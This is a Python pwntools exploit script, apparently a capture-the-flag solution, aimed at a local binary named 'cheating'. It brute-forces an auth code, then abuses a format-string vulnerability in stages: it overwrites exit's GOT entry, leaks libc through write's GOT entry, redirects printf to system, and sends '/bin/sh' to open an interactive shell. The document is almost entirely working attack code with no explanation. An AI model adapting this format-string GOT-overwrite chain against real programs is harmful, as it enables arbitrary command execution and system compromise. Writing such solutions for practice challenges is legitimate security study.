from pwn import *
authen_code = "cheating U0"
def passcheck():
	while True:
		p = process("./cheating")
		p.sendafter("auth code: ",authen_code)
		try:
			p.recvuntil("s")
			break
		except:
			p.close()
	return p
context.bits = 64
p = passcheck()
elf = ELF("./cheating")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
#p.send("AAAAAAAA"+"%p"*30)
#AAAAAAAA0x7fffb53d0c900x1000x7f7f9cf4b2600x7f7f9d2180a40x7f7f9d2181200x4141414141414141
#offset = 
#stage 1 exit_got -> loop
exit_got = elf.got["exit"]
print hex(exit_got)
loop_addr = 0x0000000000400BE9
payload = "%{number}c%22$hn".format(number=0xbe9)
payload = payload.ljust(0x80,"a")
payload += p64(exit_got)
#payload = fmtstr_payload(6,{exit_got:loop_addr})#,numbwritten=0x9+0xc)
p.send(payload)
#stage 2 leak exit_got
write_got = elf.got["write"]
payload = "*****%23$s*****"
payload = payload.ljust(0x80,"a")
payload += p64(write_got)
p.sendafter("slogan: ",payload)
p.recvuntil("*"*5)
info = p.recvuntil("*"*5,drop=True)
print info
write_addr = u64(info.ljust(8,"\x00"))
libc.address = write_addr - libc.symbols["write"]
#gdb.attach(p,"b printf")
#stage 3 printf_got -> system
system_addr = libc.symbols["system"]
printf_got = 0x602030
payload = fmtstr_payload(24,{printf_got:system_addr},write_size='short')

payload = payload[32:].ljust(0x80,"a") + payload[:32]
temp = int(payload[0+1:payload.find("c")]) + 32
payload = "%" + str(temp) + payload[payload.find("c"):]
p.send(payload)
#stage 4 send /bin/sh
payload = "/bin/sh\x00;"
p.send(payload)
p.interactive()
